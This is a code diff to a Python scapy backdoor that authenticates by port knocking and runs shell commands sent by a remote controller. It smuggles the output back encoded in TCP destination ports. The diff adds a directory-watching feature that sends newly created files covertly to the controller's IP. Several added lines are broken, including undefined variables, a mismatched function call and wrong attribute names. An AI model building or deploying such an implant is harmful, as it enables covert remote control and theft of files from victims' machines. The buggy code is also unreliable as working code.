@@ -6,11 +6,19 @@ import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 from subprocess import *
+from watchdog.observers import Observer
+from watchdog.events import FileSystemEventHandler
 from random import randint
 from Crypto.Cipher import AES
 CONN_IPS = collections.defaultdict(list)
 CMDS = collections.defaultdict(list)
+
 MASTER_KEY = "CorrectHorseBatteryStapleGunHead"
+
+
+class NewFileHandler(FileSystemEventHandler):
+	def on_created(self, event):
+		raise Exception("new", event.srcpath)
 
 
 def encrypt_val(text):
@@ -32,12 +40,26 @@ def verify_root():
 		exit("This program must be run with root/sudo")
 
 
-def char_packet(dest, char1, char2=None):
-    if(char2 is None):
-        destport = ord(char1) << 8
-    else:
-        destport = (ord(char1) << 8) + ord(char2)
-    return IP(dst=dest) / TCP(sport=80, dport=destport)
+def file_to_binary(file, header):
+	byte = header + file.read()
+	binary = list(bin(int('1'+binascii.hexlify(byte), 16))[3:].zfill(8))
+	binary = ''.join(binary)
+	byte_list = [binary[i:i+8] for i in range(0, len(binary), 8)]
+	return byte_list
+
+
+def data_packet(dest, val1, val2=None):
+	if(len(val1) == 1):
+		if(val2 is None):
+			destport = ord(char1) << 8
+		else:
+			destport = (ord(char1) << 8) + ord(char2)
+	else:
+		if(val2 is None):
+			destport = int(bin1, 2)
+		else:
+			destport = int(bin1 + bin2, 2)
+	return IP(dst=dest) / TCP(sport=80, dport=destport)
 
 
 def end_msg(dest):
@@ -47,13 +69,13 @@ def end_msg(dest):
 
 
 def send_msg(msg, ip):
-    for char1, char2 in zip(msg[0::2], msg[1::2]):
-        # delay_sleep()
-        send(char_packet(ip, char1, char2))
-    if(len(msg) % 2):
-        # delay_sleep()
-        send(char_packet(ip, msg[len(msg) - 1]))
-    end_msg(ip)
+	for char1, char2 in zip(msg[0::2], msg[1::2]):
+		# delay_sleep()
+		send(data_packet(ip, char1, char2))
+	if(len(msg) % 2):
+		# delay_sleep()
+		send(data_packet(ip, msg[-1]))
+	end_msg(ip)
 
 
 def run_cmd(packet, cmd):
@@ -80,12 +102,30 @@ def run_cmd(packet, cmd):
 	send_msg(''.join(output), packet[1].src)
 
 
+def watch_dir(packet, path):
+	event_handler = NewFileHandler()
+	observer = Observer()
+	observer.schedule(event_handler, path, recursive=False)
+	observer.start()
+
+	try:
+		while True:
+			sleep(1)
+	except Exception as e:
+		if(e.args[0] == "new"):
+			observer.stop()
+			f_binary = file_to_binary(e.args[1])
+			send_msg(f_binary, packet[2].src)
+			return
+	observer.join()
+
+
 def execute(packet, command):
 	cmd = command.split(' ', 1)
 	if(cmd[0] == "run"):
 		run_cmd(packet, cmd[1])
 	elif(cmd[0] == "watch"):
-		print("STALK DIRS")
+		watch_dir(packet, cmd[1])
 	else:
 		print(cmd)
 
@@ -104,7 +144,6 @@ def decode(packet):
 		CMDS[ip] += "{}{}".format(char1, char2)
 	else:
 		CMDS[ip] += "{}".format(char1)
-	print("ran decode: {}".format(CMDS[ip]))
 
 
 def port_knock_auth(packet):
